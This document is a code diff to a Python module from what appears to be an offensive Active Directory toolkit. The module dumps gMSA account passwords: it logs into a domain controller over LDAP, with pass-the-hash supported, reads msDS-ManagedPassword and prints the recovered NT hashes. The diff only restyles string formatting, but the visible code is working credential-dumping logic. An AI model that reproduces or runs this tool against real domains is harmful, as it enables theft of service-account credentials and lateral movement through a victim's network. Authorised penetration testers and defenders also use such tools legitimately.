@@ -1,5 +1,4 @@
 """gMSA password dump — extract msDS-ManagedPassword from gMSA accounts."""
-from __future__ import annotations
 import sys
 import struct
 import hashlib
@@ -27,11 +26,11 @@ def run(args: Any) -> int:
     cred = ADCredential.from_args(args)
     dc_ip = getattr(args, "dc_ip", args.target)
 
-    print("[*] gMSA password dump → {}".format(dc_ip))
+    print(f"[*] gMSA password dump → {dc_ip}")
     try:
         from impacket.ldap import ldap as imp_ldap
         base_dn = "DC=" + ",DC=".join(args.domain.split("."))
-        conn = imp_ldap.LDAPConnection("ldap://{}".format(dc_ip), base_dn)
+        conn = imp_ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
         if cred.has_hash:
             conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
         else:
@@ -47,7 +46,7 @@ def run(args: Any) -> int:
                 attrs = entry["attributes"]
                 sam = str(attrs.get("sAMAccountName", ""))
                 managed_pw = attrs.get("msDS-ManagedPassword")
-                print("  gMSA: {}".format(sam))
+                print(f"  gMSA: {sam}")
                 if managed_pw and isinstance(managed_pw, bytes):
                     parsed = _parse_gmsa_blob(managed_pw)
                     print("    [+] NT Hash: {}".format(parsed["nt_hash"]))
@@ -55,8 +54,8 @@ def run(args: Any) -> int:
                 else:
                     print("    [-] Password not readable")
 
-        print("[*] {} gMSA hashes retrieved".format(found))
+        print(f"[*] {found} gMSA hashes retrieved")
         return 0 if found > 0 else 1
     except Exception as exc:
-        print("[-] gMSA dump error: {}".format(exc), file=sys.stderr)
+        print(f"[-] gMSA dump error: {exc}", file=sys.stderr)
         return 1
